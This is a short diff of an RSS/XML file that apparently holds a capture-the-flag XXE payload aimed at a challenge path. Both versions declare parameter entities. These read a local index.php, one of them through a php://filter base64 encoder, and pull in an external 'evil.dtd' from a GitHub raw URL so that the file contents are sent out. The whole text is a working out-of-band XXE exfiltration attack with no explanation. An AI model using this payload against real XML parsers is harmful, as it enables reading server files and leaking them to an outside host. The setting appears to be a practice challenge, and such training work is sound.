@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE rss [ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php">
-<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/chamanoukistouka/testing_xml/main/evil.dtd"> %dtd; ]>
+<!DOCTYPE data [ <!ENTITY % file SYSTEM "file::///challenge/web-serveur/ch29/index.php">
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/chamanoukistouka/testing_xml/main/evil.dtd"> %dtd;]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page </title>
